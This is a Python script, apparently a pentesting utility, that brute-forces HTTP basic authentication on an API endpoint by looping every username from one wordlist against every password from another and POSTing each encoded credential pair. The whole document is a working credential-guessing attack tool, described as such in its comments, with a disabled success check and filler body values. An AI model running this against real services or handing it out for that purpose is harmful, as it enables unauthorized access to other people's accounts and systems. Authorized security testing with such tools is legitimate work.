import requests
from base64 import b64encode

# this script takes in a userlist and pwlist and 
# bruteforces an API with 
# basic authentication headers
# it also includes a dynamic body payload
# by default this trys out different users and pws in a nested loop
# input file should have the userlist pw list in a file with each value on a new line

passwordList = []
userList =[]

userdict = input("Enter path to user file: ")
pwdict = input("Enter path to pw file: ")
url = input("Enter API endpoint: ")

def createPassList(dict_file):
    with open(dict_file, 'r') as d:
        for line in d.readlines():
            password = line.strip('\n')
            passwordList.append(password)

def createUserList(dict_file):
    with open(dict_file, 'r') as d:
        for line in d.readlines():
            user = line.strip('\n')
            userList.append(user)

def tryBrute():
    for usr in userList:

        for pwd in passwordList:

            userAndPass = usr + ":" + pwd
            print("attacking api with " + userAndPass)
            userAndPassEncode = b64encode(userAndPass.encode()).decode("ascii")
            authString = str('Basic %s' %  userAndPassEncode)
            
            headers = {
            'authorization': authString,
            'cache-control': "no-cache",
            }
            print("sending payload to url: " + url)
            print("setting the authstring to: " + authString)
            data = {
    "username" : "fjjjjjdddfff",
    "password" : "gggg"}

            response = requests.request("POST", url, headers=headers, json=data)
            #if response.status_code == 200:
            #    print(usr + ":" + pwd)
            print(response)

createUserList(userdict)
createPassList(pwdict)
tryBrute()
